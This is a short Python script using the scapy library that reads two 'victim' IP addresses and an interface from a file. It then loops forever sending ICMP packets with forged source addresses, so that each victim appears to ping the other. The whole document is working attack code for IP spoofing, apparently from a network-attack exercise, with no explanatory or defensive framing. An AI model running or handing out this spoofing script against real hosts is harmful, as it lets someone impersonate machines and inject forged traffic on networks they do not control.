import sys
from scapy.all import *
import time

fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()

ip_victime1 = contenu[0]
ip_victime2 = contenu[2]
iface = contenu[6]

while True:
    send(IP(src=ip_victime1, dst=ip_victime2)/ICMP(), iface=iface)
    send(IP(src=ip_victime2, dst=ip_victime1)/ICMP(), iface=iface)
    time.sleep(1)